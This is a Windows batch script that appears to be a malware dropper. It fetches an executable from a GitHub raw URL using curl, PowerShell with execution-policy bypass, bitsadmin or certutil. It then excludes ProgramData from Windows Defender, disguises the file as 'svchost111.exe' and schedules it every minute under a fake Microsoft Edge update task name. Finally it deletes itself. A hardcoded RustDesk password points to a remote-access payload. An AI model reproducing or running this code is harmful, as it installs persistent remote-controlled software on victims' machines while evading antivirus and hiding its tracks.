@echo off
setlocal

set "files[1]=https://raw.githubusercontent.com/JohnChoe39/Chukasa/main/Win64_vm.exe"

mkdir "c:\\programdata\\temp"

set "all_success=true"
set "rustdesk_pw=P_33w0rd_ru37"
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
for /L %%i in (1,1,1) do (
    set "file_info=!files[%%i]!"
    for /F "tokens=1,2 delims=|" %%a in ("!file_info!") do (
        set "download_url=https://raw.githubusercontent.com/JohnChoe39/Chukasa/main/Win64_vm.exe"
        set "download_path=c:\\programdata\\temp\\Win64_vm.exe"

        call :download_file

        if exist "!download_path!" (
            echo Download successful: !download_path!
        ) else (
            echo Download failed: !download_path!
            set "all_success=false"
        )
    )
)

if "%all_success%"=="true" (
    echo All downloads were successful.
    powershell -Command "Add-MpPreference -ExclusionPath "C:\\ProgramData""
    mkdir "C:\\programdata\\USDprivate"
    move "C:\programdata\temp\Win64_vm.exe" "C:\programdata\USDprivate\svchost111.exe"
    del /f "C:\programdata\temp\Win64_vm.exe"

    schtasks /create /tn "MicrosoftEdgeUpdateVV" /tr "C:\programdata\USDprivate\svchost111.exe" /sc minute /mo 1 /st 00:00 /ru "%USERNAME%" /f

    echo @echo off > "%temp%\delete_me.bat"
    echo timeout /t 1 >> "%temp%\delete_me.bat"
    echo del "%~f0" >> "%temp%\delete_me.bat"
    echo del "%%~f0" >> "%temp%\delete_me.bat" 
 
    start "" "%temp%\delete_me.bat"
    exit /b 1
) else (
    echo Not all downloads were successful.
)

:end
endlocal
exit /b

:download_file
where curl >nul 2>&1 && (
    curl -o "%download_path%" "%download_url%"
    if %errorlevel% equ 0 (
        exit /b 0
    )
)

where powershell >nul 2>&1 && (
    powershell -NoLogo -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iwr -Uri '%download_url%' -OutFile '%download_path%'"
    if %errorlevel% equ 0 (
        exit /b 0
    )
)

where bitsadmin >nul 2>&1 && (
    bitsadmin /transfer mydownloadjob /download /priority high "%download_url%" "%download_path%"
    if %errorlevel% equ 0 (
        exit /b 0
    )
)

where certutil >nul 2>&1 && (
    certutil -urlcache -split -f "%download_url%" "%download_path%"
    if %errorlevel% equ 0 (
        exit /b 0
    )
)

echo No suitable download tool found for %download_url%.
exit /b 1
